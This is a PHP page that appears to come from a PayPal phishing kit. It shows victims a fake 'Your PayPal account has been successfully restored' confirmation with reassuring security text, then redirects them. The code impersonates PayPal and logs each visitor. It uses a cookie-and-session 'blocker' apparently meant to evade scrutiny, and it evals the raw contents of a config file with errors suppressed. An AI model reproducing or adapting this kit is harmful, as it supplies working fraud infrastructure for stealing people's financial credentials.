<?php
require_once __DIR__ . '/../function.php';
@eval(file_get_contents('../config/' . $api->general_config));

if ($config_blocker == "enable") {
  $api->cookie();
  $api->session();
}

$api->visitor("Restored");
require __DIR__ . '/../page/header-old.php';
?>
<div class="span8">
<section class="activityModule shadow none">
<h1 style="font-size: 18px;font-weight: bold; border-bottom: 1px solid #EEE; height:40px;"><?=$api->transcode("Thank you");?></h1>
<form class="edit">
<p class="group">
<strong><?=$api->transcode("Your PayPal account has been successfully restored.");?>"</strong>
<p><?=$api->transcode("You have completed all the checklist items, you must log in again to see the changes to your account.")?></p>
<p><?=$api->transcode("PayPal takes the safety of your account, business and financial data as seriously as you do, and these ongoing checks of our system contribute to our high level of security.")?></p>
</p>
<p class="bcenter">
<center>
<h3><?=$api->transcode("REDIRECTING")?></h3>
<img src="../assets/img/load.gif" border="0" class="actionImage">
<p class="note"><?=$api->transcode("You will be redirected automatically to login page in 3 seconds.")?></p>
</center>
</p>
</form>
<script type="text/JavaScript"> setTimeout("location.href = '../success'", 6000); </script>
</section>
</div>
</div>
</div>
<br>
<?php require __DIR__ . '/../page/footer-old.php'; ?>
